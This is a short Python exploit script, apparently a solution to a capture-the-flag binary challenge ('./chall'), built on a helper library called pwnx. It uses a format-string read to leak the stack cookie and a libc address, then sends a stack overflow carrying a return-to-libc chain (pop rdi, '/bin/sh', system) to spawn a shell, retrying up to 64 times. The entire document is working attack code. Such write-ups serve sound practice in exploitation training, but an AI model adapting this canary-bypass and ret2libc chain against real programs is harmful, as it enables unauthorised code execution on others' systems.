from pwnx import Challenge


x = Challenge("./chall", libc="./libc.so.6")

leaks = x.input.line(b"name: ").format_leak(
    b"%17$p|%23$p",
    after=b"hello ",
    separator=(b"|", b"\n"),
    cookie="hex",
    libc="hex",
)

x.relate(x.libc.base, leaks.libc - 0x29D90)

overflow = (
    x.craft("stage 2 overflow")
    .pad_to(24, fill=b"A", label="buffer")
    .word(leaks.cookie, label="stack cookie")
    .pad(8, fill=b"B", label="saved frame")
    .word(x.libc.base + 0x2A3E5, label="pop rdi")
    .word(x.libc.base + 0x1D8698, label="/bin/sh")
    .word(x.libc.base + 0x50D70, label="system")
    .require(no=b"\n", max_size=0x100)
)

x.send(overflow, to=x.input.line(b"payload: "))
x.run(attempts=64)
